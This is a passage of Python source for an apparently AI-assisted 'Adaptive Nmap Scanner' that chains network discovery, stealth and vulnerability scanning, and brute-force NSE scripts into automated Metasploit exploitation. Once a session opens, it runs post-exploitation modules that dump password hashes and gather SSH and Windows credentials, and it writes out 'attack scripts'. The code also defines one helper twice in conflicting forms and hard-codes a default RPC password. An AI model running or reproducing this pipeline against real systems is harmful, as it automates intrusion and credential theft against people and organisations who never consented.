    except subprocess.CalledProcessError:
        print(f"Host {{TARGET}} appears to be down")
    
    # Check each open port
    for port in OPEN_PORTS:
        print(f"Checking port {{port}}...")
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                result = s.connect_ex((TARGET, port))
                if result == 0:
                    print(f"Port {{port}} is open")
                else:
                    print(f"Port {{port}} is closed")
        except Exception as e:
            print(f"Error checking port {{port}}: {{e}}")
    
    print("Reconnaissance completed")

if __name__ == "__main__":
    main()
"""
        return script
    
    def _get_script_extension(self, script_type):
        """Get the appropriate file extension for the script type."""
        script_type = script_type.lower()
        if script_type == "bash" or script_type == "shell":
            return "sh"
        elif script_type == "python":
            return "py"
        elif script_type == "ruby":
            return "rb"
        elif script_type == "perl":
            return "pl"
        elif script_type == "powershell":
            return "ps1"
        else:
            return "txt"
    
    def execute_generated_script(self, script_path, args=None):
        """Execute a generated script."""
        if not os.path.exists(script_path):
            self.logger.error(f"Script not found: {script_path}")
            return False
            
        try:
            self.logger.info(f"Executing script: {script_path}")
            self.viewer.status(f"Executing script: {os.path.basename(script_path)}")
            
            # Determine script type from extension
            file_ext = os.path.splitext(script_path)[1].lower()
            
            # Build command based on script type
            if file_ext == ".py":
                cmd = ["python3", script_path]
            elif file_ext == ".rb":
                cmd = ["ruby", script_path]
            elif file_ext == ".pl":
                cmd = ["perl", script_path]
            elif file_ext == ".ps1":
                cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path]
            else:
                # Default to bash for .sh and unknown extensions
                cmd = ["bash", script_path]
            
            # Add any additional arguments
            if args:
                cmd.extend(args)
            
            # Execute the script
            self.logger.debug(f"Executing: {' '.join(cmd)}")
            
            # Start animation
            animation = self.viewer.scanning_animation(f"Running {os.path.basename(script_path)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait for it to complete
            output, error = process.communicate()
            
            # Stop animation
            animation.set()
            
            # Combine stdout and stderr
            combined_output = output
            if error:
                combined_output += f"\nERROR OUTPUT:\n{error}"
            
            # Display summary
            self.viewer.script_execution_summary(
                script_path,
                process.returncode,
                combined_output
            )
            
            if process.returncode == 0:
                self.logger.info(f"Script executed successfully")
                return True
            else:
                self.logger.error(f"Script execution failed with return code {process.returncode}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error executing script: {e}")
            self.viewer.error(f"Script execution failed: {str(e)}")
            return False

    def run(self):
        """
        Main method to execute the full scanning workflow
        """
        logging.info("Starting Adaptive Nmap Scanner")
        scan_targets = []
        
        # Determine targets
        if self.auto_discover:
            logging.info("Auto-discovering hosts on the network")
            discovered_hosts = self.discover_hosts()
            
            if not discovered_hosts:
                logging.warning("No hosts discovered")
                return
                
            if self.scan_all:
                scan_targets = discovered_hosts
                logging.info(f"Scanning all {len(discovered_hosts)} discovered hosts")
            else:
                # Pick the most interesting hosts based on some criteria
                scan_targets = self.select_targets(discovered_hosts)
                logging.info(f"Selected {len(scan_targets)} hosts for scanning")
        elif self.target:
            # Use the specified target
            scan_targets = [self.target]
            logging.info(f"Using provided target: {self.target}")
        else:
            logging.error("No targets specified and auto-discovery is disabled")
            return
            
        # Run the scans in iterations
        scan_results = []
        vuln_results = []
        
        if self.continuous:
            logging.info("Running in continuous mode until stopped")
            iteration = 0
            
            try:
                while True:
                    iteration += 1
                    logging.info(f"Starting scan iteration {iteration}")
                    
                    result = self.execute_nmap_scan(scan_targets)
                    scan_results.append(result)
                    
                    if self.vulnerability_scan:
                        vuln_result = self.run_vulnerability_scan(result.get('hosts', []))
                        vuln_results.append(vuln_result)
                        
                    # Save results if an output file is specified
                    if self.output_file:
                        self.save_results(scan_results, vuln_results)
                        
                    logging.info(f"Completed scan iteration {iteration}")
                    
                    # Delay before next iteration
                    time.sleep(self.delay)
            except KeyboardInterrupt:
                logging.info("Continuous scanning stopped by user")
        else:
            # Run for a fixed number of iterations
            for i in range(self.iterations):
                logging.info(f"Starting scan iteration {i+1}/{self.iterations}")
                
                result = self.execute_nmap_scan(scan_targets)
                scan_results.append(result)
                
                if self.vulnerability_scan:
                    vuln_result = self.run_vulnerability_scan(result.get('hosts', []))
                    vuln_results.append(vuln_result)
                    
                # Delay before next iteration, but not after the last one
                if i < self.iterations - 1:
                    time.sleep(self.delay)
        
        # Save final results if an output file is specified
        if self.output_file:
            self.save_results(scan_results, vuln_results)
            
        # Generate attack script if requested
        if self.generate_script:
            script_path = self.generate_attack_script(scan_results, vuln_results)
            if script_path:
                logging.info(f"Attack script generated: {script_path}")
                
        logging.info("Adaptive Nmap Scanner completed successfully")
        
    def discover_hosts(self):
        """
        Discover hosts on the network
        """
        logging.info("Discovering hosts on the network")
        hosts = []
        
        # Determine target network
        if self.network:
            target = self.network
        else:
            # Auto-detect network based on interface
            interface = self.interface
            if not interface:
                # Try to find default interface
                try:
                    import netifaces
                    gateways = netifaces.gateways()
                    if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                        interface = gateways['default'][netifaces.AF_INET][1]
                except (ImportError, KeyError):
                    logging.error("Failed to determine default interface, please specify --interface")
                    return []
                    
            try:
                import netifaces
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    netmask = addrs[netifaces.AF_INET][0]['netmask']
                    
                    # Calculate network in CIDR notation
                    import ipaddress
                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                    target = str(network)
                else:
                    logging.error("No IPv4 address assigned to interface")
                    return []
            except (ImportError, ValueError, KeyError) as e:
                logging.error(f"Failed to calculate network: {str(e)}")
                return []
                
        logging.info(f"Discovering hosts on network: {target}")
        
        # Run ping sweep with Nmap to discover hosts
        nmap_cmd = ["nmap", "-sn", target, "-oX", "-"]
        
        try:
            process = subprocess.Popen(
                nmap_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if not self.quiet:
                self.animate_loading(f"Discovering hosts on {target}", process)
                
            stdout, stderr = process.communicate()
            
            if process.returncode != 0:
                logging.error(f"Host discovery failed: {stderr}")
                return []
                
            # Parse the XML output
            import xml.etree.ElementTree as ET
            try:
                tree = ET.fromstring(stdout)
                for host in tree.findall('.//host'):
                    status = host.find('status')
                    if status is not None and status.get('state') == 'up':
                        # Get the host's IP address
                        for addr in host.findall('address'):
                            if addr.get('addrtype') == 'ipv4':
                                hosts.append(addr.get('addr'))
                                break
            except Exception as e:
                logging.error(f"Failed to parse host discovery results: {str(e)}")
                traceback.print_exc()
                
        except Exception as e:
            logging.error(f"Error during host discovery: {str(e)}")
            traceback.print_exc()
            
        logging.info(f"Discovered {len(hosts)} hosts")
        return hosts
        
    def select_targets(self, hosts, limit=10):
        """
        Select a subset of hosts for scanning based on basic heuristics.
        For now, just pick the first N hosts.
        """
        return hosts[:min(limit, len(hosts))]
        
    def animate_loading(self, message, process, frames=None):
        """Display an animated loading indicator while a process is running"""
        if frames is None:
            frames = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
            
        i = 0
        while process.poll() is None:
            frame = frames[i % len(frames)]
            print(f"\r{message} {frame}", end='', flush=True)
            time.sleep(0.1)
            i += 1
            
        # Clear the animation line
        print("\r" + " " * (len(message) + 10) + "\r", end='')
        
    def save_results(self, scan_results, vuln_results):
        """Save scan results to a file"""
        if not self.output_file:
            return
            
        logging.info(f"Saving results to {self.output_file}")
        
        output_format = self.output_format.lower()
        
        try:
            combined_results = {
                "scan_results": scan_results,
                "vulnerability_results": vuln_results,
                "timestamp": time.time(),
                "date": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            if output_format == 'json':
                import json
                with open(self.output_file, 'w') as f:
                    json.dump(combined_results, f, indent=2)
            elif output_format == 'xml':
                # Simple XML conversion
                import xml.dom.minidom
                import json
                
                # Convert to JSON first
                json_str = json.dumps(combined_results)
                
                # Create XML structure
                doc = xml.dom.minidom.Document()
                root = doc.createElement("adaptive_scan_results")
                doc.appendChild(root)
                
                # Add a CDATA section with the JSON
                cdata = doc.createCDATASection(json_str)
                root.appendChild(cdata)
                
                # Write to file with pretty printing
                with open(self.output_file, 'w') as f:
                    f.write(doc.toprettyxml(indent="  "))
            else:
                # Default to text format
                with open(self.output_file, 'w') as f:
                    f.write("Adaptive Nmap Scanner Results\n")
                    f.write("============================\n")
                    f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    
                    f.write("Scan Results:\n")
                    f.write("-------------\n")
                    for i, result in enumerate(scan_results):
                        f.write(f"Scan #{i+1}:\n")
                        for host in result.get('hosts', []):
                            host_ip = None
                            for addr in host.get('addresses', []):
                                if addr.get('addrtype') == 'ipv4':
                                    host_ip = addr.get('addr')
                                    break
                                    
                            f.write(f"  Host: {host_ip}\n")
                            
                            # Write port information
                            for port in host.get('ports', []):
                                port_id = port.get('id', {}).get('portid', 'unknown')
                                protocol = port.get('id', {}).get('protocol', 'tcp')
                                state = port.get('state', {}).get('state', 'unknown')
                                service = port.get('service', {}).get('name', 'unknown')
                                
                                f.write(f"    {port_id}/{protocol} - {state} - {service}\n")
                            
                            f.write("\n")
                            
                    if vuln_results:
                        f.write("\nVulnerability Results:\n")
                        f.write("---------------------\n")
                        for result in vuln_results:
                            f.write(f"Host: {result.get('host')}\n")
                            
                            for vuln in result.get('vulnerabilities', []):
                                f.write(f"  {vuln.get('type')} on {vuln.get('port')}/{vuln.get('protocol')} ({vuln.get('service')})\n")
                                
                                # Write CVE IDs if available
                                if 'cve_ids' in vuln and vuln['cve_ids']:
                                    f.write(f"    CVEs: {', '.join(vuln['cve_ids'])}\n")
                                    
                                # Write CVSS score if available
                                if 'cvss_score' in vuln:
                                    f.write(f"    CVSS: {vuln['cvss_score']}\n")
                                    
                                f.write(f"    Output: {vuln.get('output', 'N/A')[:200]}...\n\n")
                
            logging.info(f"Results saved to {self.output_file}")
        except Exception as e:
            logging.error(f"Failed to save results: {str(e)}")
            traceback.print_exc()

    def execute_nmap_scan(self, target, scan_type="basic"):
        """Execute Nmap scan with specified options."""
        try:
            # Set up command arguments
            cmd = ["nmap"]
            
            # Add port specification
            if self.ports == "all":
                cmd.append("-p-")
            elif self.ports == "quick":
                cmd.append("-F")
            elif self.ports:
                if isinstance(self.ports, (list, tuple)):
                    ports_str = ','.join(str(p) for p in self.ports)
                else:
                    ports_str = str(self.ports)
                cmd.extend(["-p", ports_str])
            
            # Add scan type options
            if scan_type == "basic":
                cmd.append("-sS")
            elif scan_type == "stealth":
                cmd.extend(["-sS", "-T2", "--randomize-hosts"])
            elif scan_type == "comprehensive":
                cmd.extend(["-sS", "-sV", "-O", "--version-intensity", "5"])
            elif scan_type == "vulnerability":
                cmd.extend(["-sS", "-sV", "-O", "--script", "vuln"])
            
            # Add additional options based on flags
            if self.services:
                cmd.append("-sV")
            if self.version_detection:
                cmd.extend(["-sV", "--version-intensity", "5"])
            if self.os_detection:
                cmd.append("-O")
            if self.vulnerability_scan:
                cmd.append("--script=vuln")
            
            # Add target and output format
            cmd.extend(["-oX", "-", str(target)])
            
            # Execute Nmap command
            logging.debug(f"Executing Nmap command: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                logging.error(f"Nmap scan failed: {result.stderr}")
                return None
            
            # Parse XML output
            try:
                root = ET.fromstring(result.stdout)
                scan_results = self.parse_nmap_xml(root)
                
                # Convert to JSON if requested
                if self.output_format == "json":
                    json_file = f"scan_results_{target}.json"
                    self.xml_to_json(result.stdout, json_file)
                    logging.info(f"Results saved to {json_file}")
                
                return scan_results
            except ET.ParseError as e:
                logging.error(f"Error parsing Nmap XML output: {e}")
                return None
                
        except Exception as e:
            logging.error(f"Error executing Nmap scan: {e}")
            return None
    
    def xml_to_json(self, xml_file, json_file):
        """Convert Nmap XML output to JSON format."""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            # Convert XML to dict
            def node_to_dict(node):
                result = {}
                
                # Add attributes
                for key, value in node.attrib.items():
                    result[key] = value
                
                # Process child elements
                for child in node:
                    child_dict = node_to_dict(child)
                    
                    # If this is a list-like element, append to list
                    if child.tag in result:
                        if not isinstance(result[child.tag], list):
                            result[child.tag] = [result[child.tag]]
                        result[child.tag].append(child_dict)
                    else:
                        result[child.tag] = child_dict
                
                # Add text content if present
                if node.text and node.text.strip():
                    if result:
                        result["_text"] = node.text.strip()
                    else:
                        result = node.text.strip()
                
                return result
            
            # Convert to dict and save as JSON
            nmap_dict = node_to_dict(root)
            with open(json_file, 'w') as f:
                json.dump(nmap_dict, f, indent=2)
            
            self.logger.info(f"Converted Nmap XML output to JSON: {json_file}")
        except Exception as e:
            self.logger.error(f"Failed to convert XML to JSON: {e}")
            if self.debug:
                traceback.print_exc()

    def parse_nmap_xml(self, tree):
        """Parse Nmap XML output and return structured data."""
        root = tree.getroot()
        result = {
            'hosts': [],
            'stats': {},
            'scan_info': {}
        }
        
        # Get scan info
        if root.find('scaninfo') is not None:
            scan_info = root.find('scaninfo').attrib
            result['scan_info'] = scan_info
        
        # Get stats
        if root.find('runstats') is not None:
            finished = root.find('runstats/finished')
            if finished is not None:
                result['stats']['finished'] = finished.attrib
            
            hosts = root.find('runstats/hosts')
            if hosts is not None:
                result['stats']['hosts'] = hosts.attrib
        
        # Process each host
        for host in root.findall('host'):
            host_data = {
                'addresses': [],
                'hostnames': [],
                'ports': [],
                'os': [],
                'status': host.find('status').attrib if host.find('status') is not None else {},
                'scripts': []
            }
            
            # Get addresses
            for addr in host.findall('address'):
                host_data['addresses'].append(addr.attrib)
            
            # Get hostnames
            hostnames = host.find('hostnames')
            if hostnames is not None:
                for hostname in hostnames.findall('hostname'):
                    host_data['hostnames'].append(hostname.attrib)
            
            # Get ports and services
            ports = host.find('ports')
            if ports is not None:
                for port in ports.findall('port'):
                    port_data = {
                        'id': port.attrib,
                        'state': port.find('state').attrib if port.find('state') is not None else {},
                        'service': port.find('service').attrib if port.find('service') is not None else {},
                        'scripts': []
                    }
                    
                    # Get script output
                    for script in port.findall('script'):
                        script_data = {
                            'id': script.attrib.get('id', ''),
                            'output': script.attrib.get('output', '')
                        }
                        port_data['scripts'].append(script_data)
                    
                    host_data['ports'].append(port_data)
            
            # Get OS detection
            os_elem = host.find('os')
            if os_elem is not None:
                for osmatch in os_elem.findall('osmatch'):
                    os_data = {
                        'name': osmatch.attrib.get('name', ''),
                        'accuracy': osmatch.attrib.get('accuracy', ''),
                        'osclass': []
                    }
                    
                    for osclass in osmatch.findall('osclass'):
                        os_data['osclass'].append(osclass.attrib)
                    
                    host_data['os'].append(os_data)
            
            # Get host scripts
            hostscript = host.find('hostscript')
            if hostscript is not None:
                for script in hostscript.findall('script'):
                    script_data = {
                        'id': script.attrib.get('id', ''),
                        'output': script.attrib.get('output', '')
                    }
                    host_data['scripts'].append(script_data)
            
            result['hosts'].append(host_data)
        
        return result

    def run_vulnerability_scan(self, target_hosts):
        """
        Run vulnerability scans against target hosts using Nmap NSE scripts
        and/or Metasploit modules if available.
        """
        logging.info("Starting vulnerability scan for %d hosts", len(target_hosts))
        results = []
        
        # Choose appropriate NSE scripts for vulnerability scanning
        vuln_scripts = "vuln,exploit,auth,brute"
        
        if self.custom_vuln_file:
            # If user provided custom vulnerability definitions
            try:
                with open(self.custom_vuln_file, 'r') as f:
                    custom_scripts = f.read().strip()
                    if custom_scripts:
                        vuln_scripts = custom_scripts
                logging.info(f"Using custom vulnerability scripts from {self.custom_vuln_file}")
            except Exception as e:
                logging.error(f"Failed to load custom vulnerability file: {str(e)}")
        
        for host in target_hosts:
            host_addr = None
            # Extract the actual IP address
            for addr in host.get('addresses', []):
                if addr.get('addrtype') == 'ipv4':
                    host_addr = addr.get('addr')
                    break
            
            if not host_addr:
                logging.warning("Could not determine IP address for host, skipping vulnerability scan")
                continue
                
            # Get open ports
            open_ports = []
            for port in host.get('ports', []):
                port_state = port.get('state', {}).get('state')
                if port_state == 'open':
                    port_id = port.get('id', {}).get('portid')
                    if port_id:
                        open_ports.append(port_id)
            
            if not open_ports:
                logging.info(f"No open ports found for {host_addr}, skipping vulnerability scan")
                continue
                
            logging.info(f"Running vulnerability scan on {host_addr} with {len(open_ports)} open ports")
            
            # Run Nmap NSE vulnerability scan
            ports_arg = ",".join(open_ports)
            nmap_cmd = [
                "nmap", "-sV", "--script", vuln_scripts,
                "-p", ports_arg, host_addr, "-oX", "-"
            ]
            
            try:
                logging.debug(f"Executing: {' '.join(nmap_cmd)}")
                process = subprocess.Popen(
                    nmap_cmd, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                # Animated loading
                if not self.quiet:
                    self.animate_loading(f"Scanning {host_addr} for vulnerabilities", process)
                
                stdout, stderr = process.communicate()
                
                if process.returncode != 0:
                    logging.error(f"Nmap vulnerability scan failed: {stderr}")
                else:
                    # Parse the XML output
                    try:
                        import xml.etree.ElementTree as ET
                        tree = ET.fromstring(stdout)
                        vuln_results = self.extract_vulnerabilities(tree, host_addr)
                        results.append(vuln_results)
                        logging.info(f"Found {len(vuln_results.get('vulnerabilities', []))} potential vulnerabilities for {host_addr}")
                    except Exception as e:
                        logging.error(f"Failed to parse vulnerability scan results: {str(e)}")
                        traceback.print_exc()
                        
            except Exception as e:
                logging.error(f"Error during vulnerability scan: {str(e)}")
                traceback.print_exc()
                
            # If MSF is enabled, use it for additional vulnerability checks
            if self.msf_options and self.msf_module:
                try:
                    msf_results = self.run_metasploit_scan(host_addr, open_ports)
                    if msf_results:
                        # Merge with Nmap results
                        for res in results:
                            if res.get('host') == host_addr:
                                res.setdefault('msf_results', []).extend(msf_results)
                except Exception as e:
                    logging.error(f"Error during Metasploit scan: {str(e)}")
                    traceback.print_exc()
                    
        return results

    def extract_vulnerabilities(self, tree, host_addr):
        """Extract vulnerabilities from Nmap NSE script output"""
        result = {
            'host': host_addr,
            'vulnerabilities': []
        }
        
        root = tree
        
        # Find the host element for the target host
        for host_elem in root.findall('.//host'):
            # Check if this is the host we're looking for
            addr_elem = host_elem.find(".//address[@addr='" + host_addr + "']")
            if addr_elem is None:
                continue
                
            # Process ports and their script outputs
            for port_elem in host_elem.findall('.//port'):
                port_id = port_elem.attrib.get('portid', 'unknown')
                protocol = port_elem.attrib.get('protocol', 'tcp')
                service_elem = port_elem.find('service')
                service_name = service_elem.attrib.get('name', 'unknown') if service_elem is not None else 'unknown'
                
                # Process script results for this port
                for script_elem in port_elem.findall('.//script'):
                    script_id = script_elem.attrib.get('id', '')
                    output = script_elem.attrib.get('output', '')
                    
                    # Only include vulnerability-related scripts
                    if 'vuln' in script_id or 'exploit' in script_id or 'brute' in script_id:
                        vuln_info = {
                            'port': port_id,
                            'protocol': protocol,
                            'service': service_name,
                            'type': script_id,
                            'output': output.strip(),
                            'source': 'nmap_nse'
                        }
                        
                        # Attempt to extract CVE IDs or other vulnerability identifiers
                        cve_match = re.findall(r'CVE-\d{4}-\d{4,7}', output)
                        if cve_match:
                            vuln_info['cve_ids'] = cve_match
                            
                        # Check for CVSS scores
                        cvss_match = re.search(r'CVSS\s+(\d+\.\d+)', output)
                        if cvss_match:
                            vuln_info['cvss_score'] = cvss_match.group(1)
                            
                        result['vulnerabilities'].append(vuln_info)
                        
            # Process host scripts
            hostscript_elem = host_elem.find('hostscript')
            if hostscript_elem is not None:
                for script_elem in hostscript_elem.findall('script'):
                    script_id = script_elem.attrib.get('id', '')
                    output = script_elem.attrib.get('output', '')
                    
                    # Only include vulnerability-related scripts
                    if 'vuln' in script_id or 'exploit' in script_id or 'brute' in script_id:
                        vuln_info = {
                            'port': 'N/A',
                            'protocol': 'N/A',
                            'service': 'host',
                            'type': script_id,
                            'output': output.strip(),
                            'source': 'nmap_nse'
                        }
                        
                        # Attempt to extract CVE IDs or other vulnerability identifiers
                        cve_match = re.findall(r'CVE-\d{4}-\d{4,7}', output)
                        if cve_match:
                            vuln_info['cve_ids'] = cve_match
                            
                        # Check for CVSS scores
                        cvss_match = re.search(r'CVSS\s+(\d+\.\d+)', output)
                        if cvss_match:
                            vuln_info['cvss_score'] = cvss_match.group(1)
                            
                        result['vulnerabilities'].append(vuln_info)
                        
        return result

    def run_metasploit_scan(self, host_addr, open_ports):
        """Run a Metasploit scan against a target host"""
        if not self.msf_options or not self.msf_module:
            logging.info("Metasploit options or module not specified, skipping MSF scan")
            return []
            
        logging.info(f"Running Metasploit scan on {host_addr}")
        results = []
        
        try:
            # Import Metasploit libraries
            from pymetasploit3.msfrpc import MsfRpcClient
            
            # Connect to MSF RPC
            msf_host = self.msf_options.get('host', '127.0.0.1')
            msf_port = int(self.msf_options.get('port', 55552))
            msf_user = self.msf_options.get('user', 'msf')
            msf_pass = self.msf_options.get('pass', 'abc123')
            
            logging.debug(f"Connecting to MSF RPC at {msf_host}:{msf_port}")
            client = MsfRpcClient(msf_pass, server=msf_host, port=msf_port, ssl=False, username=msf_user)
            logging.debug("Connected to MSF RPC")
            
            # Use the specified module
            module_type, module_name = self.msf_module.split('/', 1)
            
            if module_type not in ['auxiliary', 'exploit', 'scanner']:
                logging.error(f"Unsupported Metasploit module type: {module_type}")
                return []
                
            # Get the module
            module = client.modules.use(module_type, module_name)
            logging.debug(f"Using MSF module: {self.msf_module}")
            
            # Set required options
            module['RHOSTS'] = host_addr
            
            # If ports are specified, add them
            if module.required and 'RPORT' in module.required:
                # Use the first open port if available
                if open_ports:
                    module['RPORT'] = open_ports[0]
            
            # Set payload if exploit
            if module_type == 'exploit' and self.msf_payload:
                module['PAYLOAD'] = self.msf_payload
                
            # Execute the module
            logging.info(f"Executing MSF module {self.msf_module} against {host_addr}")
            job_id = module.execute()
            
            # Wait for results
            import time
            time.sleep(5)  # Initial wait
            
            # Get job info
            jobs = client.jobs.list
            logging.debug(f"Active MSF jobs: {jobs}")
            
            # Check session results
            sessions = client.sessions.list
            logging.debug(f"MSF sessions: {sessions}")
            
            if sessions:
                for session_id, session_info in sessions.items():
                    logging.info(f"MSF session established: {session_id} - {session_info.get('info', 'No info')}")
                    results.append({
                        'type': 'msf_session',
                        'session_id': session_id,
                        'info': session_info
                    })
                    
                    # If post-exploitation is enabled, run post modules
                    if self.post_exploitation and session_info.get('type') == 'meterpreter':
                        post_results = self.run_post_exploitation(client, session_id)
                        results.extend(post_results)
                    
                    # Cleanup - close session if not needed
                    if not self.post_exploitation:
                        client.sessions.session(session_id).stop()
            
            # Get console output for auxiliary modules
            if module_type == 'auxiliary':
                # Create a console to view output
                console_id = client.consoles.console().cid
                console = client.consoles.console(console_id)
                
                # Read output
                output = console.read()
                if output and output.get('data'):
                    results.append({
                        'type': 'msf_auxiliary_output',
                        'output': output.get('data'),
                        'module': self.msf_module
                    })
                    
                # Destroy console
                console.destroy()
                
            return results
                
        except ImportError:
            logging.error("Failed to import pymetasploit3. Make sure it's installed.")
            return []
        except Exception as e:
            logging.error(f"Error during Metasploit scan: {str(e)}")
            traceback.print_exc()
            return []
            
    def run_post_exploitation(self, msf_client, session_id):
        """Run post-exploitation modules if a session is established"""
        results = []
        
        try:
            session = msf_client.sessions.session(session_id)
            
            # Basic system info
            logging.info(f"Running post-exploitation on session {session_id}")
            
            if hasattr(session, 'run_with_output'):
                # Run basic commands
                commands = [
                    "sysinfo",
                    "getuid",
                    "getpid",
                    "ps",
                    "ipconfig"
                ]
                
                for cmd in commands:
                    try:
                        output = session.run_with_output(cmd)
                        results.append({
                            'type': 'msf_post_command',
                            'command': cmd,
                            'output': output
                        })
                    except Exception as e:
                        logging.error(f"Error running post command '{cmd}': {str(e)}")
                
                # Run appropriate post modules
                post_modules = [
                    "post/windows/gather/hashdump",
                    "post/linux/gather/hashdump",
                    "post/multi/gather/ssh_creds",
                    "post/windows/gather/credentials/credential_collector"
                ]
                
                for module_name in post_modules:
                    try:
                        module = msf_client.modules.use('post', module_name.split('/', 2)[2])
                        module['SESSION'] = session_id
                        job_id = module.execute()
                        
                        # Wait for execution
                        import time
                        time.sleep(3)
                        
                        # Get console output
                        console_id = msf_client.consoles.console().cid
                        console = msf_client.consoles.console(console_id)
                        output = console.read()
                        
                        results.append({
                            'type': 'msf_post_module',
                            'module': module_name,
                            'output': output.get('data') if output else "No output"
                        })
                        
                        console.destroy()
                    except Exception as e:
                        logging.error(f"Error running post module '{module_name}': {str(e)}")
            
        except Exception as e:
            logging.error(f"Error during post-exploitation: {str(e)}")
            traceback.print_exc()
            
        return results

    def generate_attack_script(self, scan_results, vulnerability_results):
        """Generate an attack script based on scan results and discovered vulnerabilities"""
        if not self.generate_script:
            return None
            
        logging.info("Generating attack script based on scan results")
        
        # Determine script type
        script_type = self.script_type or 'python'  # Default to Python
        script_name = self.generate_script_name or f"attack_script_{int(time.time())}"
        
        # Add extension if not already there
        if not script_name.endswith(self._get_script_extension(script_type)):
            script_name += self._get_script_extension(script_type)
            
        script_content = []
        
        # Add script header and imports
        script_content.extend(self._generate_script_header(script_type))
        
        # Add target information
        targets = []
        for result in scan_results:
            for host in result.get('hosts', []):
                host_ip = None
                for addr in host.get('addresses', []):
                    if addr.get('addrtype') == 'ipv4':
                        host_ip = addr.get('addr')
                        break
                        
                if host_ip:
                    targets.append(host_ip)
                    
        script_content.extend(self._generate_target_section(script_type, targets))
        
        # Add exploit code for vulnerabilities if any
        if vulnerability_results:
            script_content.extend(self._generate_exploit_section(script_type, vulnerability_results))
            
        # Add utility functions
        script_content.extend(self._generate_utility_section(script_type))
        
        # Add main execution block
        script_content.extend(self._generate_main_section(script_type))
        
        # Write script to file
        try:
            with open(script_name, 'w') as f:
                f.write('\n'.join(script_content))
            
            # Make script executable if not on Windows
            if not sys.platform.startswith('win') and (script_type == 'bash' or script_type == 'python'):
                os.chmod(script_name, os.stat(script_name).st_mode | stat.S_IXUSR | stat.S_IXGRP)
                
            logging.info(f"Attack script generated: {script_name}")
            return script_name
        except Exception as e:
            logging.error(f"Failed to generate attack script: {str(e)}")
            traceback.print_exc()
            return None
            
    def _get_script_extension(self, script_type):
        """Get the appropriate file extension for the script type"""
        extensions = {
            'python': '.py',
            'bash': '.sh',
            'powershell': '.ps1',
            'ruby': '.rb'
        }
        return extensions.get(script_type, '.txt')
        
    def _generate_script_header(self, script_type):
        """Generate the header section of the script"""
        headers = {
            'python': [
                "#!/usr/bin/env python3",
                "# Auto-generated attack script by Adaptive Nmap Scanner",
                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
                "",
                "import os",
                "import sys",
                "import time",
                "import socket",
                "import subprocess",
                "import random",
                "import argparse",
                "import logging",
                "import threading",
                "try:",
                "    import requests",
                "    REQUESTS_AVAILABLE = True",
                "except ImportError:",
                "    REQUESTS_AVAILABLE = False",
                "",
                "# Setup logging",
                "logging.basicConfig(",
                "    level=logging.INFO,",
                "    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'",
                ")",
                "logger = logging.getLogger('attack_script')",
                ""
            ],
            'bash': [
                "#!/bin/bash",
                "# Auto-generated attack script by Adaptive Nmap Scanner",
                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
                "",
                "# Set up logging",
                "LOGFILE=\"attack_log_$(date +%s).log\"",
                "",
                "log() {",
                "    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $1\" | tee -a \"$LOGFILE\"",
                "}",
                "",
                "log \"Starting attack script\"",
                ""
            ],
            'powershell': [
                "# Auto-generated attack script by Adaptive Nmap Scanner",
                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
                "",
                "# Set up logging",
                "$LogFile = \"attack_log_$(Get-Date -Format 'yyyyMMddHHmmss').log\"",
                "",
                "function Write-Log {",
                "    param ([string]$Message)",
                "    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'",
                "    \"[$timestamp] $Message\" | Tee-Object -FilePath $LogFile -Append",
                "}",
                "",
                "Write-Log \"Starting attack script\"",
                ""
            ],
            'ruby': [
                "#!/usr/bin/env ruby",
                "# Auto-generated attack script by Adaptive Nmap Scanner",
                "# Generated on: " + time.strftime("%Y-%m-%d %H:%M:%S"),
                "",
                "require 'logger'",
                "require 'socket'",
                "require 'timeout'",
                "",
                "# Set up logging",
                "logger = Logger.new(STDOUT)",
                "logger.level = Logger::INFO",
                "file_logger = Logger.new(\"attack_log_#{Time.now.to_i}.log\")",
                "file_logger.level = Logger::INFO",
                "",
                "def log(message)",
                "  logger.info(message)",
                "  file_logger.info(message)",
                "end",
                "",
                "log \"Starting attack script\"",
                ""
            ]
        }
        return headers.get(script_type, ["# Auto-generated attack script"])

def parse_arguments():
    parser = argparse.ArgumentParser(description='Adaptive Nmap Scanner with AI Integration')
    
    # Target selection arguments
    parser.add_argument('target', nargs='?', help='Target host or network to scan')
    parser.add_argument('--auto-discover', action='store_true', help='Automatically discover network and hosts')
    parser.add_argument('--interface', help='Network interface to use for discovery')
    parser.add_argument('--scan-all', action='store_true', help='Scan all discovered hosts')
    parser.add_argument('--network', help='Specific network to scan (CIDR notation)')
    parser.add_argument('--host-timeout', type=int, default=1, help='Timeout for host discovery (default: 1)')
    
    # Scan options
    parser.add_argument('-m', '--model', default='qwen2.5-coder:7b', help='Ollama model to use (default: qwen2.5-coder:7b)')
    parser.add_argument('-i', '--iterations', type=int, default=3, help='Maximum number of scan iterations (default: 3)')
    parser.add_argument('-c', '--continuous', action='store_true', help='Run in continuous mode until manually stopped')
    parser.add_argument('-d', '--delay', type=int, default=2, help='Delay between scans (default: 2)')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode to avoid detection')
    parser.add_argument('--ports', default='quick', help='Ports to scan: all, quick, or custom range (default: quick)')
